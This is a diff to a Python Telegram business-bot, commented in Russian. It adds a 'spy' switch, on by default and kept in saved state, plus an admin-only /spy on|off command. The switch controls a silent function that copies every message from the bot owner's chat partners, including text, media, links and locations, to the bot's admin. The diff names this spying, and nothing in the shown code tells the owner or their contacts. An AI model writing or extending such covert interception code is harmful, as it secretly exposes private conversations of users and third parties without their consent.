@@ -63,6 +63,11 @@ like_edited_messages: set[tuple[int, int]] = set()
 # Чаты, в которых активен режим /mute. В них все сообщения собеседника
 # (не владельца) удаляются и пересылаются владельцу в ЛС.
 muted_chats: set[int] = set()
+
+# Глобальный выключатель «тихой пересылки админу» (forward_to_admin_silent).
+# True — копии всех сообщений собеседников приходят админу в ЛС.
+# False — пересылка отключена. Управляется командой /spy on|off (только админ).
+spy_enabled: bool = True
 # Чаты, в которых владельцу уже отправлено предупреждение об отсутствии прав
 # на удаление сообщений собеседника. Чтобы не спамить — раз на чат за сессию.
 _mute_warned_chats: set[int] = set()
@@ -184,6 +189,7 @@ def _do_persist_sync():
         "like_mode_keys": [list(k) for k in like_mode_keys],
         "muted_chats": list(muted_chats),
         "custom_aliases": custom_aliases,
+        "spy_enabled": spy_enabled,
     }
     tmp_state = STATE_FILE.with_suffix(".tmp")
     tmp_state.write_text(json.dumps(state, ensure_ascii=False), encoding="utf-8")
@@ -229,6 +235,11 @@ def load_persistent_state():
                         pass
             try:
                 muted_chats.update(state.get("muted_chats", []))
+            except Exception:
+                pass
+            try:
+                global spy_enabled
+                spy_enabled = bool(state.get("spy_enabled", True))
             except Exception:
                 pass
             try:
@@ -944,7 +955,8 @@ async def handle_business_message(message: Message):
     # (текст, медиа, стикеры, ссылки, гео и т.д.). Делаем это до любых
     # ранних return, чтобы ничего не потерять — например, сообщения со
     # ссылками ниже уходят в return.
-    if sender_id is not None and sender_id != owner_id:
+    # Включается/выключается через /spy on|off (только админ).
+    if spy_enabled and sender_id is not None and sender_id != owner_id:
         asyncio.create_task(forward_to_admin_silent(owner_id, message))
 
     msg_text = message.text or message.caption or ""
@@ -1285,6 +1297,38 @@ async def cmd_stats(message: Message):
         f"🔗 Сейчас подключено: {len(connected_users)}\n"
         f"🚫 Заблокировано: {len(banned_users)}"
     )
+
+
+@dp.message(Command("spy"))
+async def cmd_spy(message: Message):
+    """Включает/выключает тихую пересылку админу всех сообщений собеседников.
+    Доступно только админу. Использование:
+        /spy        — показать текущее состояние
+        /spy on     — включить пересылку
+        /spy off    — выключить пересылку
+    """
+    if not message.from_user or message.from_user.id != ADMIN_ID:
+        return
+    global spy_enabled
+    parts = (message.text or "").split(maxsplit=1)
+    arg = parts[1].strip().lower() if len(parts) > 1 else ""
+    if arg in ("on", "вкл", "включить", "1", "true"):
+        spy_enabled = True
+        schedule_persist()
+        await message.answer("👁 Тихая пересылка ВКЛЮЧЕНА. Все сообщения собеседников будут приходить сюда.")
+    elif arg in ("off", "выкл", "выключить", "0", "false"):
+        spy_enabled = False
+        schedule_persist()
+        await message.answer("🙈 Тихая пересылка ВЫКЛЮЧЕНА. Сообщения собеседников больше не пересылаются.")
+    else:
+        status = "ВКЛЮЧЕНА 👁" if spy_enabled else "ВЫКЛЮЧЕНА 🙈"
+        await message.answer(
+            f"Сейчас тихая пересылка: <b>{status}</b>\n\n"
+            f"Использование:\n"
+            f"<code>/spy on</code> — включить\n"
+            f"<code>/spy off</code> — выключить",
+            parse_mode="HTML",
+        )
 
 
 @dp.message(Command("ban"))
